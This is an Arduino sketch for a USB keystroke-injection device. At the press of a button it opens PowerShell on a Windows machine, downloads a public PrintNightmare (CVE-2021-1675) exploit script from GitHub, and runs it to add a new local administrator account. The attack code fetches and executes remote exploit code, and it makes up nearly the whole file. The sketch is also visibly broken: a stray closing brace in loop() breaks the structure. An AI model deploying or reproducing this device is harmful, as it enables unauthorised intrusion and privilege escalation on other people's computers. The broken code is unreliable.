#include <Keyboard.h>
#include <EEPROM.h>
char stringArray[500] = {""};
boolean extracted = false, dispatched = false;
int extractButton = 2, dispatchButton = 3;

void setup() {
    Serial.begin(9600);
    pinMode(extractButton, INPUT);
    //pinMode(dispatchButton, INPUT);
    Keyboard.begin();
}
void loop() {
    if(digitalRead(extractButton) == HIGH && !extracted) {
        run();
        extracted = true;
    }
    }    
    if(digitalRead(extractButton) == LOW)
        extracted = false;
    //if(digitalRead(dispatchButton) == LOW)
        //dispatched = false;
}

void run() {
    Keyboard.press(KEY_LEFT_GUI, 'r');
    Keyboard.release(KEY_LEFT_GUI, 'r');
    Keyboard.print("powershell.exe");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.print("Invoke-WebRequest https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -OutFile cve.ps1");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.print("Import-Module ./cve.ps1");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.print("Invoke-Nightmare -NewUser 'testing' -NewPassword 'cood' -DriverName 'PrintMe'");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);

    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();
    EEPROM.put(1, stringArray);
}
